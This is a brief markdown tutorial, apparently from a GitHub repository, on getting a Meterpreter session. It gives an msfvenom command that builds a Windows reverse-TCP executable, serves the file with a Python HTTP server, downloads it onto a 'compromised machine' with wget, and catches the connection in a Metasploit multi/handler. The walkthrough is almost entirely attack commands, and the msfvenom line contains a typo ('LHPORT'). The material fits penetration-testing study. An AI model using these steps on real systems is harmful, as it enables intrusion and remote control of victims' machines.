# Meterpreter shell

Lets first create our payload using the msfvenom and then send it on the compromised machine and then run it..

    msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o revshell.exe LHOST=<> LHPORT=<>

Now lets transfer this file on the compromised machine using http python server deploy it on the machine using 

    python -m http.server <port>

Downlaod the file on the compromised machine using the command 

    wget http://<ip>:<port>/revshell.exe

![Screenshot 2023-11-18 143633](https://github.com/Theincognitomode/What-the-shell/assets/73027020/5ae458a3-72c3-4f67-a695-445744b227ab)

Now run the msfconsole 


- Select the module multi/handler
- set the LHOST and LPORT
- set the payload


Now type `run`

![Screenshot 2023-11-18 144645](https://github.com/Theincognitomode/What-the-shell/assets/73027020/275ffe8e-8754-4acb-9866-a3f7f453ac21)


Now just double click on the payload that you sent and you will get the meterpreter session..







